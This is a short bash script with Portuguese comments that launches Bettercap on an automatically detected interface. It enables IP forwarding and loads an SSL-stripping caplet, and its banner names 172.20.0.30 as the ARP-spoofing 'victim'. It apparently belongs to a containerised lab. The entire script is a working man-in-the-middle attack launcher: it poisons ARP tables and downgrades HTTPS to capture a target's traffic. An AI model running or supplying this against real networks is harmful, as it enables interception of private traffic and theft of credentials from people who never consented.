#!/bin/bash
# Inicializador do Bettercap com Caplet de SSL Stripping

echo "=================================================="
echo "    INICIANDO BETTERCAP - SSL STRIPPING & ARP     "
echo "=================================================="

# Habilita IP Forwarding no container se possível
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true

IFACE=$(ip route | grep default | awk '{print $5}' | head -n1)
IFACE=${IFACE:-eth0}

echo "[+] Interface de rede detectada: $IFACE"
echo "[+] Carregando caplet /app/sslstrip.cap..."
echo "[+] Alvo ARP Spoofing: 172.20.0.30 (Vítima)"
echo "[+] Modo SSL Strip: ATIVO"
echo "=================================================="

exec /app/bettercap -iface "$IFACE" -caplet /app/sslstrip.cap
